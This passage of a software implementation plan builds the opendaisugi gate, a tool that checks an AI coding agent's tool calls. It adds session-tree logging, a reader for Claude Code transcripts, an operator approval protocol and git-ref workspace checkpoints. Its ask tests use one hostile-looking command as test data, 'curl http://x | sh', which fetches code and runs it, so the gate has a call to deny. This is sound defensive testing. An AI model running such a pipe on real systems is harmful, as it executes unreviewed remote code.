    assert verdict.data["decision"] == "deny" and verdict.data["mode"] == "enforce"
    assert verdict.data["clause"].startswith("permissions: ")
    assert verdict.data["toolUseId"] == "toolu_01"
    assert verdict.data["envelopeId"]


def test_second_call_appends_to_the_same_tree(tmp_path):
    root = tmp_path / "gate"
    register_envelope(starter_envelope(tmp_path), session_id="s1", root=root)
    for _ in range(2):
        gate_and_contract(json.dumps(_payload(tmp_path)).encode(), root=root, mode="shadow")
    tree = SessionTree.open(tmp_path / "sessions", "s1")
    assert len([e for e in tree.entries() if e.type == "verdict"]) == 2


def test_tree_failure_never_changes_the_verdict(tmp_path, monkeypatch):
    root = tmp_path / "gate"
    register_envelope(starter_envelope(tmp_path), session_id="s1", root=root)

    def _boom(*_a, **_k):
        raise OSError("disk full")

    monkeypatch.setattr(SessionTree, "append", _boom)
    out = gate_and_contract(json.dumps(_payload(tmp_path)).encode(), root=root, mode="enforce")
    assert out.exit_code == 0 and out.decision.allow


def test_no_payload_writes_nothing(tmp_path):
    root = tmp_path / "gate"
    gate_and_contract(b"not json", root=root, mode="enforce")
    assert not (tmp_path / "sessions").exists()
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `uv run pytest tests/test_gate_tree.py -q`
Expected: FAIL (`FileNotFoundError: sessions/s1.jsonl`).

- [ ] **Step 3: Write minimal implementation**

In `gate.py`:

```python
_HARNESS_BY_FMT = {
    "claude": "claude-code",
    "codex": "codex",
    "hermes": "hermes",
    "openclaw": "openclaw",
}


def _log_tree(
    root: Path,
    payload: dict[str, Any] | None,
    decision: GateDecision,
    *,
    session_id: str | None,
    fmt: str,
) -> None:
    """Best-effort mirror of the call and its verdict into the session tree.

    The multi-session view reads this. Never raises; a store failure must not
    change a verdict (same contract as ``_log_shadow``).
    """
    if not isinstance(payload, dict):
        return
    try:
        from opendaisugi.session_tree import SessionTree

        sid = _safe_session_id(session_id or payload.get("session_id"))
        tree = SessionTree.open_or_create(
            root.parent / "sessions",
            session_id=sid,
            harness=_HARNESS_BY_FMT.get(fmt, fmt),
            cwd=str(payload.get("cwd") or ""),
            harness_session_id=payload.get("session_id"),
            transcript_path=payload.get("transcript_path"),
        )
        tool_use_id = payload.get("tool_use_id")
        call = tree.append(
            "tool_call",
            {
                "toolUseId": tool_use_id,
                "name": decision.tool_name or payload.get("tool_name"),
                "stepType": decision.step_type,
                "detail": decision.detail,
                "agentId": payload.get("agent_id"),
                "agentType": payload.get("agent_type"),
            },
        )
        tree.append(
            "verdict",
            {
                "toolUseId": tool_use_id,
                "decision": "allow" if decision.allow else "deny",
                "wouldDeny": decision.would_deny,
                "mode": decision.mode,
                "reason": decision.reason,
                "clause": decision.clause,
                "counterexample": decision.counterexample,
                "envelopeId": decision.envelope_id,
                "planId": decision.plan_id,
                "latencyMs": round(decision.elapsed_ms, 3),
                "answeredBy": "operator" if decision.ask else None,
            },
            parent_id=call.id,
        )
    except Exception:  # noqa: BLE001 — logging is best-effort by contract
        pass
```

In `gate_and_contract`, right after the `_log_shadow(...)` call:
`_log_tree(root, payload, decision, session_id=session_id, fmt=fmt)`.

- [ ] **Step 4: Run tests to verify they pass**

Run: `uv run pytest tests/test_gate_tree.py tests/test_gate.py tests/test_hook_gate_contract.py -q`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add src/opendaisugi/gate.py tests/test_gate_tree.py
git commit -m "feat(gate): every gated call and its verdict land in the session tree"
```

---

### Task 6: Read Claude Code's transcript: usage and the parentUuid tree

**Files:**
- Create: `src/opendaisugi/claude_transcript.py`
- Test: `tests/test_claude_transcript.py` (new)

**Interfaces:**
- Produces: `Turn`, `read_turns(path) -> list[Turn]`, `usage_totals(turns) -> dict`, `last_prompt_uuid(turns) -> str | None`, `leaf_uuids(turns) -> list[str]`, `last_model(turns) -> str | None`.

- [ ] **Step 1: Write the failing tests**

```python
# tests/test_claude_transcript.py
"""Claude Code's own JSONL: usage counters and the parentUuid tree, read-only."""

from __future__ import annotations

import json
from pathlib import Path

from opendaisugi.claude_transcript import (
    last_model,
    last_prompt_uuid,
    leaf_uuids,
    read_turns,
    usage_totals,
)

ROWS = [
    {"type": "summary", "summary": "x"},
    {
        "type": "user",
        "uuid": "u1",
        "parentUuid": None,
        "sessionId": "s",
        "timestamp": "2026-08-27T10:00:00Z",
        "message": {"role": "user", "content": "list files"},
    },
    {
        "type": "assistant",
        "uuid": "a1",
        "parentUuid": "u1",
        "timestamp": "2026-08-27T10:00:01Z",
        "message": {
            "role": "assistant",
            "model": "claude-sonnet-4",
            "content": [
                {"type": "text", "text": "Sure."},
                {"type": "tool_use", "id": "toolu_01", "name": "Bash", "input": {"command": "ls"}},
            ],
            "usage": {
                "input_tokens": 12,
                "cache_read_input_tokens": 1000,
                "cache_creation_input_tokens": 50,
                "output_tokens": 30,
            },
        },
    },
    {
        "type": "user",
        "uuid": "u2",
        "parentUuid": "a1",
        "timestamp": "2026-08-27T10:00:02Z",
        "message": {
            "role": "user",
            "content": [{"type": "tool_result", "tool_use_id": "toolu_01", "content": "a b"}],
        },
    },
    {
        "type": "assistant",
        "uuid": "a2",
        "parentUuid": "u2",
        "timestamp": "2026-08-27T10:00:03Z",
        "message": {
            "role": "assistant",
            "model": "claude-sonnet-4",
            "content": [{"type": "text", "text": "Done."}],
            "usage": {
                "input_tokens": 5,
                "cache_read_input_tokens": 1100,
                "cache_creation_input_tokens": 0,
                "output_tokens": 4,
            },
        },
    },
    {
        "type": "user",
        "uuid": "u3",
        "parentUuid": "a1",
        "timestamp": "2026-08-27T10:05:00Z",
        "message": {"role": "user", "content": "try again"},
    },  # a branch from a1
]


def _write(tmp_path: Path) -> Path:
    p = tmp_path / "t.jsonl"
    p.write_text("\n".join(json.dumps(r) for r in ROWS) + "\ntorn{", encoding="utf-8")
    return p


def test_read_turns_keeps_ids_kinds_and_usage(tmp_path):
    turns = read_turns(_write(tmp_path))
    assert [t.uuid for t in turns] == ["u1", "a1", "u2", "a2", "u3"]
    assert turns[1].parent_uuid == "u1" and turns[1].kind == "assistant"
    assert turns[1].usage == {"fresh": 12, "cacheRead": 1000, "cacheWrite": 50, "out": 30}
    assert turns[1].tool_uses == [{"id": "toolu_01", "name": "Bash"}]
    assert turns[2].tool_result_ids == ["toolu_01"]
    assert turns[0].text == "list files" and turns[1].text.startswith("Sure.")
    assert turns[1].model == "claude-sonnet-4"


def test_usage_totals_sum_assistant_turns(tmp_path):
    assert usage_totals(read_turns(_write(tmp_path))) == {
        "fresh": 17,
        "cacheRead": 2100,
        "cacheWrite": 50,
        "out": 34,
    }


def test_last_prompt_is_the_last_real_user_message(tmp_path):
    assert last_prompt_uuid(read_turns(_write(tmp_path))) == "u3"


def test_leaves_and_model(tmp_path):
    turns = read_turns(_write(tmp_path))
    assert sorted(leaf_uuids(turns)) == ["a2", "u3"]
    assert last_model(turns) == "claude-sonnet-4"


def test_missing_file_is_empty(tmp_path):
    assert read_turns(tmp_path / "nope.jsonl") == []
    assert usage_totals([]) == {"fresh": 0, "cacheRead": 0, "cacheWrite": 0, "out": 0}
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `uv run pytest tests/test_claude_transcript.py -q`
Expected: FAIL with `ModuleNotFoundError`.

- [ ] **Step 3: Write minimal implementation**

```python
# src/opendaisugi/claude_transcript.py
"""Read Claude Code's session JSONL for what daisugi cannot see from a hook.

On path D Claude owns the prefix and the tree. Its transcript carries
``uuid``/``parentUuid`` on every row and ``message.usage`` on every assistant
turn. daisugi reads it read-only, joined to its own verdicts by ``tool_use_id``.
"""

from __future__ import annotations

import json
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any

_EMPTY_USAGE = {"fresh": 0, "cacheRead": 0, "cacheWrite": 0, "out": 0}
_TEXT_LIMIT = 400


@dataclass(frozen=True)
class Turn:
    uuid: str
    parent_uuid: str | None
    kind: str  # "user" | "assistant"
    ts: str
    model: str | None
    usage: dict[str, int]
    text: str
    tool_uses: list[dict[str, Any]] = field(default_factory=list)
    tool_result_ids: list[str] = field(default_factory=list)


def _usage(msg: dict[str, Any]) -> dict[str, int]:
    u = msg.get("usage") or {}
    return {
        "fresh": int(u.get("input_tokens") or 0),
        "cacheRead": int(u.get("cache_read_input_tokens") or 0),
        "cacheWrite": int(u.get("cache_creation_input_tokens") or 0),
        "out": int(u.get("output_tokens") or 0),
    }


def _content(msg: dict[str, Any]) -> tuple[str, list[dict[str, Any]], list[str]]:
    content = msg.get("content")
    if isinstance(content, str):
        return content[:_TEXT_LIMIT], [], []
    texts: list[str] = []
    uses: list[dict[str, Any]] = []
    results: list[str] = []
    for block in content or []:
        if not isinstance(block, dict):
            continue
        kind = block.get("type")
        if kind == "text":
            texts.append(str(block.get("text", "")))
        elif kind == "tool_use":
            uses.append({"id": block.get("id"), "name": block.get("name")})
        elif kind == "tool_result" and block.get("tool_use_id"):
            results.append(str(block["tool_use_id"]))
    return " ".join(texts)[:_TEXT_LIMIT], uses, results


def read_turns(path: Path) -> list[Turn]:
    out: list[Turn] = []
    try:
        text = Path(path).read_text(encoding="utf-8")
    except (OSError, UnicodeDecodeError):
        return out
    for line in text.splitlines():
        if not line.strip():
            continue
        try:
            row = json.loads(line)
        except json.JSONDecodeError:
            continue
        if not isinstance(row, dict) or row.get("type") not in ("user", "assistant"):
            continue
        msg = row.get("message")
        if not isinstance(msg, dict) or not row.get("uuid"):
            continue
        body, uses, results = _content(msg)
        out.append(
            Turn(
                uuid=str(row["uuid"]),
                parent_uuid=row.get("parentUuid"),
                kind=str(row["type"]),
                ts=str(row.get("timestamp", "")),
                model=msg.get("model"),
                usage=_usage(msg) if row["type"] == "assistant" else dict(_EMPTY_USAGE),
                text=body,
                tool_uses=uses,
                tool_result_ids=results,
            )
        )
    return out


def usage_totals(turns: list[Turn]) -> dict[str, int]:
    total = dict(_EMPTY_USAGE)
    for t in turns:
        if t.kind == "assistant":
            for k in total:
                total[k] += t.usage.get(k, 0)
    return total


def last_prompt_uuid(turns: list[Turn]) -> str | None:
    """The last user turn that is a real prompt (text, not a tool result)."""
    for t in reversed(turns):
        if t.kind == "user" and t.text and not t.tool_result_ids:
            return t.uuid
    return None


def leaf_uuids(turns: list[Turn]) -> list[str]:
    parents = {t.parent_uuid for t in turns if t.parent_uuid}
    return [t.uuid for t in turns if t.uuid not in parents]


def last_model(turns: list[Turn]) -> str | None:
    for t in reversed(turns):
        if t.kind == "assistant" and t.model:
            return t.model
    return None
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `uv run pytest tests/test_claude_transcript.py -q`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add src/opendaisugi/claude_transcript.py tests/test_claude_transcript.py
git commit -m "feat(sessions): read Claude Code transcripts for usage counters and the parentUuid tree"
```

---

### Task 7: The distillation parser keeps `uuid`, `parentUuid`, `sessionId`

**Files:**
- Modify: `src/opendaisugi/parsers/claude_code.py:443-453` (`_read_messages`)
- Test: `tests/test_claude_code_parser.py` (extend; create if absent)

- [ ] **Step 1: Write the failing test**

```python
def test_read_messages_keeps_threading_ids(tmp_path):
    import json

    from opendaisugi.parsers.claude_code import ClaudeCodeParser

    p = tmp_path / "t.jsonl"
    p.write_text(
        json.dumps(
            {
                "type": "user",
                "uuid": "u1",
                "parentUuid": None,
                "sessionId": "s9",
                "message": {"role": "user", "content": "hi"},
            }
        )
        + "\n"
    )
    msgs = ClaudeCodeParser()._read_messages(p)
    assert (
        msgs[0]["uuid"] == "u1" and msgs[0]["parentUuid"] is None and msgs[0]["sessionId"] == "s9"
    )
    assert msgs[0]["role"] == "user" and msgs[0]["content"] == "hi"
```

- [ ] **Step 2: Run test to verify it fails**

Run: `uv run pytest tests/test_claude_code_parser.py -q -k threading`
Expected: FAIL (`KeyError: 'uuid'`).

- [ ] **Step 3: Write minimal implementation**

In `_read_messages`, the modern branch appends:

```python
                        messages.append(
                            {
                                "role": msg.get("role") or row_type,
                                "content": msg.get("content", ""),
                                "uuid": d.get("uuid"),
                                "parentUuid": d.get("parentUuid"),
                                "sessionId": d.get("sessionId"),
                            }
                        )
```

Update the docstring's "flat ``{role, content}``" to mention the three ids.

- [ ] **Step 4: Run tests to verify they pass**

Run: `uv run pytest tests/test_claude_code_parser.py tests/test_codex_parser.py tests/test_cli_onboard.py -q`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add src/opendaisugi/parsers/claude_code.py tests/test_claude_code_parser.py
git commit -m "fix(parsers): keep uuid, parentUuid, sessionId so a transcript's tree is not thrown away"
```

---

### Task 8: The operator ask: a bounded hand-off from the gate to a present human

**Files:**
- Create: `src/opendaisugi/ask.py`
- Modify: `src/opendaisugi/gate.py` (`gate_and_contract` gains `ask`, `ask_timeout_s`; `_maybe_ask`; `_outcome` emits `updatedInput`; `_build_parser` gains `--ask`, `--ask-timeout`; `gate_settings_json` gains `ask`, `ask_timeout_s`)
- Modify: `src/opendaisugi/config.py` (`gate_ask: bool = False`), `src/opendaisugi/install.py:497` (`_patch_claude_gate(..., ask=False)`), `src/opendaisugi/cli.py:3203` (`install --ask`)
- Test: `tests/test_ask.py` (new)

**Interfaces:**
- Produces: `ask.write_presence/clear_presence/operator_present/post_ask/wait_answer/answer/pending_asks/propose`; `gate._maybe_ask(root, payload, decision, *, timeout_s, sleep=time.sleep) -> GateDecision`.

- [ ] **Step 1: Write the failing tests**

```python
# tests/test_ask.py
"""The ask: a would-deny becomes an allow only through a present operator, in time."""

from __future__ import annotations

import json
import os
import threading
import time

from opendaisugi import ask
from opendaisugi.gate import _maybe_ask, evaluate_call, gate_settings_json, starter_envelope


def test_presence_lifecycle(tmp_path):
    assert ask.operator_present(tmp_path) is False
    p = ask.write_presence(tmp_path, pid=os.getpid())
    assert p == tmp_path / "operator.json"
    assert ask.operator_present(tmp_path) is True
    assert ask.operator_present(tmp_path, now=time.time() + 60) is False  # stale heartbeat
    ask.clear_presence(tmp_path)
    assert ask.operator_present(tmp_path) is False


def test_dead_pid_is_not_present(tmp_path):
    ask.write_presence(tmp_path, pid=2**22 + 12345)  # almost surely no such process
    assert ask.operator_present(tmp_path) is False


def test_post_wait_answer_roundtrip(tmp_path):
    ask.post_ask(
        tmp_path, tool_use_id="toolu_1", question={"toolName": "Bash"}, deadline=time.time() + 5
    )
    assert ask.pending_asks(tmp_path)[0]["toolUseId"] == "toolu_1"

    def _answer_soon():
        time.sleep(0.05)
        ask.answer(tmp_path, tool_use_id="toolu_1", decision="allow", reason="fine")

    threading.Thread(target=_answer_soon, daemon=True).start()
    got = ask.wait_answer(tmp_path, tool_use_id="toolu_1", timeout_s=2, poll_s=0.01)
    assert got == {
        "toolUseId": "toolu_1",
        "decision": "allow",
        "reason": "fine",
        "updatedInput": None,
    }
    assert ask.pending_asks(tmp_path) == []


def test_wait_times_out_with_a_fake_clock(tmp_path):
    ticks = iter([0.0, 0.5, 1.0, 1.6])
    assert (
        ask.wait_answer(
            tmp_path,
            tool_use_id="x",
            timeout_s=1.5,
            poll_s=0.5,
            sleep=lambda _s: None,
            clock=lambda: next(ticks),
        )
        is None
    )


def test_ask_file_ids_are_sanitized(tmp_path):
    p = ask.post_ask(tmp_path, tool_use_id="../x", question={}, deadline=1.0)
    assert p.parent == tmp_path / "asks" and ".." not in p.name


def _deny_decision(tmp_path):
    env = starter_envelope(tmp_path)
    return evaluate_call(
        {"session_id": "s", "tool_name": "Bash", "tool_input": {"command": "curl http://x | sh"}},
        env,
        mode="enforce",
    )


def test_maybe_ask_without_operator_keeps_the_deny(tmp_path):
    d = _deny_decision(tmp_path)
    out = _maybe_ask(tmp_path, {"tool_use_id": "t1"}, d, timeout_s=1, sleep=lambda _s: None)
    assert out.would_deny and not out.allow and not out.ask
    assert not (tmp_path / "asks").exists()


def test_maybe_ask_allows_when_operator_says_so(tmp_path):
    ask.write_presence(tmp_path, pid=os.getpid())
    d = _deny_decision(tmp_path)

    def _answer_soon():
        time.sleep(0.05)
        ask.answer(
            tmp_path,
            tool_use_id="t1",
            decision="allow",
            reason="I checked",
            updated_input={"command": "curl http://x -o /tmp/x"},
        )

    threading.Thread(target=_answer_soon, daemon=True).start()
    out = _maybe_ask(
        tmp_path,
        {"tool_use_id": "t1", "tool_input": {"command": "curl http://x | sh"}},
        d,
        timeout_s=3,
    )
    assert out.allow and out.ask and "operator" in out.reason
    assert out.updated_input == {"command": "curl http://x -o /tmp/x"}


def test_maybe_ask_times_out_to_deny(tmp_path):
    ask.write_presence(tmp_path, pid=os.getpid())
    d = _deny_decision(tmp_path)
    ticks = iter(i * 0.3 for i in range(1000))  # a fake monotonic clock
    out = _maybe_ask(
        tmp_path,
        {"tool_use_id": "t1"},
        d,
        timeout_s=2,
        sleep=lambda _s: None,
        clock=lambda: next(ticks),
    )
    assert not out.allow and "did not answer" in out.reason


def test_maybe_ask_operator_deny_is_a_deny(tmp_path):
    ask.write_presence(tmp_path, pid=os.getpid())
    d = _deny_decision(tmp_path)
    ask.answer(tmp_path, tool_use_id="t1", decision="deny", reason="no")
    out = _maybe_ask(tmp_path, {"tool_use_id": "t1"}, d, timeout_s=1, sleep=lambda _s: None)
    assert not out.allow and out.ask and "operator denied" in out.reason


def test_settings_json_with_ask_widens_the_host_timeout(tmp_path):
    body = json.loads(gate_settings_json(mode="enforce", root=tmp_path, ask=True, ask_timeout_s=90))
    hook = body["hooks"]["PreToolUse"][0]["hooks"][0]
    assert "--ask --ask-timeout 90" in hook["command"]
    assert hook["timeout"] >= 90 + 10 + 5


def test_updated_input_reaches_stdout(tmp_path):
    from opendaisugi.gate import GateDecision, _outcome

    d = GateDecision(
        allow=True,
        would_deny=True,
        reason="allowed by operator",
        mode="enforce",
        ask=True,
        updated_input={"command": "ls"},
    )
    out = _outcome(d, "claude")
    body = json.loads(out.stdout)
    assert body["hookSpecificOutput"]["permissionDecision"] == "allow"
    assert body["hookSpecificOutput"]["updatedInput"] == {"command": "ls"}
    assert out.exit_code == 0
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `uv run pytest tests/test_ask.py -q`
Expected: FAIL with `ModuleNotFoundError: opendaisugi.ask`.

- [ ] **Step 3: Write minimal implementation**

```python
# src/opendaisugi/ask.py
"""A file protocol between the gate process and a present operator.

The gate never waits for a human who is not there: presence is a heartbeat
file with a live pid. An ask is a file; an answer is a file; a proposal
("remember this") is a file nobody applies automatically. Every path in this
module fails toward deny: no operator, no answer, malformed answer → None.
"""

from __future__ import annotations

import json
import os
import re
import time
from collections.abc import Callable
from pathlib import Path
from typing import Any

PRESENCE = "operator.json"
ASKS = "asks"
ANSWERS = "answers"
PROPOSALS = "proposals"


def _safe(raw: object) -> str:
    return re.sub(r"[^A-Za-z0-9._-]", "_", str(raw or "")).strip(".")[:128] or "none"


def _mkdir(p: Path) -> None:
    p.mkdir(parents=True, exist_ok=True, mode=0o700)
    try:
        os.chmod(p, 0o700)
    except OSError:
        pass


def _write_json(path: Path, body: dict[str, Any]) -> Path:
    _mkdir(path.parent)
    tmp = path.with_suffix(".tmp")
    tmp.write_text(json.dumps(body), encoding="utf-8")
    try:
        os.chmod(tmp, 0o600)
    except OSError:
        pass
    os.replace(tmp, path)  # readers never see a half-written file
    return path


def _read_json(path: Path) -> dict[str, Any] | None:
    try:
        body = json.loads(path.read_text(encoding="utf-8"))
    except (OSError, ValueError):
        return None
    return body if isinstance(body, dict) else None


# --- presence -------------------------------------------------------------
def write_presence(
    root: Path, *, pid: int | None = None, clock: Callable[[], float] = time.time
) -> Path:
    return _write_json(
        root / PRESENCE, {"pid": pid if pid is not None else os.getpid(), "at": clock()}
    )


def clear_presence(root: Path) -> None:
    try:
        (root / PRESENCE).unlink()
    except FileNotFoundError:
        pass


def _pid_alive(pid: int) -> bool:
    try:
        os.kill(pid, 0)
    except ProcessLookupError:
        return False
    except PermissionError:
        return True
    return True


def operator_present(root: Path, *, now: float | None = None, max_age_s: float = 15.0) -> bool:
    body = _read_json(root / PRESENCE)
    if not body:
        return False
    try:
        age = (time.time() if now is None else now) - (root / PRESENCE).stat().st_mtime
    except OSError:
        return False
    if age > max_age_s:
        return False
    pid = body.get("pid")
    return isinstance(pid, int) and _pid_alive(pid)


# --- asks and answers ------------------------------------------------------
def post_ask(
    root: Path,
    *,
    tool_use_id: str,
    question: dict[str, Any],
    deadline: float,
    clock: Callable[[], float] = time.time,
) -> Path:
    body = {"toolUseId": tool_use_id, "postedAt": clock(), "deadline": deadline, **question}
    return _write_json(root / ASKS / f"{_safe(tool_use_id)}.json", body)


def answer(
    root: Path,
    *,
    tool_use_id: str,
    decision: str,
    reason: str = "",
    updated_input: dict[str, Any] | None = None,
) -> Path:
    body = {
        "toolUseId": tool_use_id,
        "decision": decision,
        "reason": reason,
        "updatedInput": updated_input,
    }
    return _write_json(root / ANSWERS / f"{_safe(tool_use_id)}.json", body)


def wait_answer(
    root: Path,
    *,
    tool_use_id: str,
    timeout_s: float,
    poll_s: float = 0.2,
    sleep: Callable[[float], None] = time.sleep,
    clock: Callable[[], float] = time.monotonic,
) -> dict[str, Any] | None:
    """Poll for the answer file until ``timeout_s`` has passed. None on timeout or garbage."""
    path = root / ANSWERS / f"{_safe(tool_use_id)}.json"
    t_end = clock() + timeout_s
    while True:
        if path.exists():
            body = _read_json(path)
            if body and body.get("decision") in ("allow", "deny"):
                _retire(root, tool_use_id)
                return body
            return None  # a malformed answer is not an allow
        if clock() >= t_end:
            return None
        sleep(poll_s)


def _retire(root: Path, tool_use_id: str) -> None:
    try:
        (root / ASKS / f"{_safe(tool_use_id)}.json").unlink()
    except FileNotFoundError:
        pass


def pending_asks(root: Path, *, now: float | None = None) -> list[dict[str, Any]]:
    d = root / ASKS
    if not d.exists():
        return []
    now = time.time() if now is None else now
    out = []
    for p in sorted(d.glob("*.json")):
        body = _read_json(p)
        if body and float(body.get("deadline", 0)) > now:
            out.append(body)
    return out


# --- proposals -------------------------------------------------------------
def propose(
    root: Path,
    *,
    kind: str,
    scope: str,
    expires_at: float,
    body: dict[str, Any],
    clock: Callable[[], float] = time.time,
) -> Path:
    """Record a proposed envelope edit. Nothing applies it; `daisugi gate proposals` lists them."""
    from opendaisugi.session_tree import new_id

    pid = new_id()
    return _write_json(
        root / PROPOSALS / f"{pid}.json",
        {
            "id": pid,
            "kind": kind,
            "scope": scope,
            "expiresAt": expires_at,
            "createdAt": clock(),
            **body,
        },
    )
```

In `gate.py`:

```python
def _maybe_ask(
    root: Path,
    payload: dict[str, Any],
    decision: GateDecision,
    *,
    timeout_s: float,
    sleep: Callable[[float], None] = time.sleep,
    clock: Callable[[], float] = time.monotonic,
) -> GateDecision:
    """Hand a would-deny to a present operator for at most ``timeout_s``.

    No operator → the deny stands, nothing is written. Operator allow → allow,
    marked ``ask``. Operator deny, timeout, or garbage → deny with the reason.
    """
    from dataclasses import replace

    from opendaisugi import ask as _ask

    tool_use_id = payload.get("tool_use_id")
    if not tool_use_id or not _ask.operator_present(root):
        return decision
    tid = str(tool_use_id)
    _ask.post_ask(
        root,
        tool_use_id=tid,
        question={
            "sessionId": payload.get("session_id"),
            "toolName": decision.tool_name,
            "detail": decision.detail,
            "reason": decision.reason,
            "clause": decision.clause,
            "counterexample": decision.counterexample,
            "toolInput": payload.get("tool_input"),
        },
        deadline=time.time() + timeout_s,
    )
    reply = _ask.wait_answer(root, tool_use_id=tid, timeout_s=timeout_s, sleep=sleep, clock=clock)
    if reply and reply.get("decision") == "allow":
        why = reply.get("reason") or "no reason given"
        return replace(
            decision,
            allow=True,
            ask=True,
            reason=f"allowed by operator: {why}",
            updated_input=reply.get("updatedInput") or None,
        )
    why = "operator denied" if reply else f"operator did not answer within {int(timeout_s)} s"
    return replace(decision, ask=bool(reply), reason=f"{decision.reason} ({why})")
```

`gate_and_contract(..., ask: bool = False, ask_timeout_s: float = 90.0)`: after
`decision = evaluate_call(...)` add
`if ask and mode == "enforce" and decision.would_deny and isinstance(payload, dict): decision = _maybe_ask(root, payload, decision, timeout_s=ask_timeout_s)`.

`_outcome` (`gate.py:386`) must decide from `allow`, not from `would_deny`: change
`deny_now = decision.mode == "enforce" and decision.would_deny` to
`deny_now = not decision.allow`. Today the two are equivalent (`_deny` sets
`allow = (mode == "shadow")`); an operator-allowed decision is the first case where
`would_deny` stays True (the report must still show what enforce would have done) while
`allow` is True. Then, on the claude path allow branch: if `decision.updated_input`,
`stdout=json.dumps({"hookSpecificOutput": {"hookEventName": "PreToolUse", "permissionDecision": "allow", "permissionDecisionReason": decision.reason, "updatedInput": decision.updated_input}})`,
else the existing `{"continue": true}`. `tests/test_hook_gate_contract.py` pins the
existing shapes; it must stay green unchanged.

`_build_parser` (plan 2) gains `--ask` (`store_true`) and `--ask-timeout` (float, 90.0);
`run_argv` passes them. `gate_settings_json(..., ask: bool = False, ask_timeout_s: float = 90.0)`:
when `ask`, `hook_timeout_s = max(hook_timeout_s, int(ask_timeout_s + verify_timeout_s + 5))`
and the command gains ` --ask --ask-timeout {int(ask_timeout_s)}`. `config.Config` gains
`gate_ask: bool = False`. `_patch_claude_gate(..., ask: bool = False)` forwards it;
`daisugi install --gate --ask` sets it. Add `daisugi gate proposals` (lists
`proposals/*.json`; `--json`) so a proposal is visible somewhere.

- [ ] **Step 4: Run tests to verify they pass**

Run: `uv run pytest tests/test_ask.py tests/test_gate.py tests/test_gate_resident.py tests/test_install_gate_baseurl.py -q`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add src/opendaisugi/ask.py src/opendaisugi/gate.py src/opendaisugi/config.py src/opendaisugi/install.py src/opendaisugi/cli.py tests/test_ask.py
git commit -m "feat(gate): a would-deny can be handed to a present operator for a bounded time; silence is deny"
```

---

### Task 9: Workspace checkpoints as private refs (opt-in)

**Files:**
- Create: `src/opendaisugi/checkpoints.py`
- Modify: `src/opendaisugi/gate.py` (`--checkpoints` flag; `_maybe_checkpoint`)
- Test: `tests/test_checkpoints.py` (new)

**Interfaces:**
- Produces: `Checkpoint(ref, commit, covers, skipped)`, `snapshot(repo, *, session_id, entry_id, prefix="checkpoints", max_file_bytes=5_000_000) -> Checkpoint`, `restore(repo, *, ref, session_id, entry_id) -> Checkpoint` (returns the rollback checkpoint), `list_refs(repo, session_id) -> list[str]`, `is_repo(path) -> bool`.

- [ ] **Step 1: Write the failing tests**

```python
# tests/test_checkpoints.py
"""Workspace snapshots as refs under refs/daisugi/, never touching the user's index or HEAD."""

from __future__ import annotations

import subprocess
from pathlib import Path

import pytest

from opendaisugi.checkpoints import is_repo, list_refs, restore, snapshot


def _git(repo: Path, *args: str) -> str:
    return subprocess.run(
        ["git", "-C", str(repo), *args], check=True, capture_output=True, text=True
    ).stdout.strip()


@pytest.fixture
def repo(tmp_path: Path) -> Path:
    r = tmp_path / "r"
    r.mkdir()
    _git(r, "init", "-q")
    _git(r, "config", "user.email", "t@t")
    _git(r, "config", "user.name", "t")
    (r / "a.txt").write_text("one\n")
    _git(r, "add", "a.txt")
    _git(r, "commit", "-q", "-m", "init")
    return r


def test_is_repo(repo: Path, tmp_path: Path):
    assert is_repo(repo) and not is_repo(tmp_path)


def test_snapshot_records_tracked_and_untracked_without_touching_status(repo: Path):
    (repo / "a.txt").write_text("two\n")
    (repo / "b.txt").write_text("new\n")
    (repo / ".gitignore").write_text("ignored.txt\n")
    (repo / "ignored.txt").write_text("x\n")
    before = _git(repo, "status", "--porcelain")
    cp = snapshot(repo, session_id="s1", entry_id="e1")
    assert cp.ref == "refs/daisugi/checkpoints/s1/e1"
    assert _git(repo, "rev-parse", cp.ref) == cp.commit
    assert "a.txt" in cp.covers and "b.txt" in cp.covers and ".gitignore" in cp.covers
    assert "ignored.txt" not in cp.covers
    assert _git(repo, "status", "--porcelain") == before  # index and worktree untouched
    assert _git(repo, "show", f"{cp.ref}:b.txt") == "new"
    assert list_refs(repo, "s1") == [cp.ref]


def test_oversize_files_are_skipped_and_named(repo: Path):
    (repo / "big.bin").write_bytes(b"0" * 2048)
    cp = snapshot(repo, session_id="s1", entry_id="e1", max_file_bytes=1024)
    assert "big.bin" in cp.skipped and "big.bin" not in cp.covers


def test_restore_puts_files_back_and_keeps_a_rollback(repo: Path):
    (repo / "a.txt").write_text("two\n")
    cp = snapshot(repo, session_id="s1", entry_id="e1")
    (repo / "a.txt").write_text("three\n")
    (repo / "c.txt").write_text("later\n")
    rb = restore(repo, ref=cp.ref, session_id="s1", entry_id="e2")
    assert (repo / "a.txt").read_text() == "two\n"
    assert not (repo / "c.txt").exists()  # not in the snapshot, removed
    assert rb.ref.startswith("refs/daisugi/rollback/s1/")
    assert _git(repo, "show", f"{rb.ref}:c.txt") == "later"
    assert _git(repo, "rev-parse", "HEAD") == _git(repo, "rev-parse", "HEAD")  # HEAD unchanged


def test_refs_stay_out_of_branches_tags_and_plain_log(repo: Path):
    snapshot(repo, session_id="s1", entry_id="e1")
    assert "daisugi" not in _git(repo, "log", "--oneline")
    assert "daisugi" not in _git(repo, "branch", "-a")
    assert "daisugi" not in _git(repo, "tag")
    # honest limit: `git log --all` and `git for-each-ref` do list refs/daisugi/*
    assert "refs/daisugi/checkpoints/s1/e1" in _git(repo, "for-each-ref", "--format=%(refname)")
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `uv run pytest tests/test_checkpoints.py -q`
Expected: FAIL with `ModuleNotFoundError`.

- [ ] **Step 3: Write minimal implementation**

```python
# src/opendaisugi/checkpoints.py
"""Workspace checkpoints as private refs in the user's own repo.

A snapshot is a commit object under ``refs/daisugi/checkpoints/<session>/<id>``
built through a temporary index, so the user's index, HEAD, branches, tags and
stash never change. The refs live under ``refs/`` on purpose: ``git gc`` keeps
what they reach. The honest cost: ``git log --all`` and ``git for-each-ref`` do
list them; plain ``git log``, ``git branch``, ``git tag`` and ``git status`` do
not. Restore first snapshots the current state to ``refs/daisugi/rollback/...``,
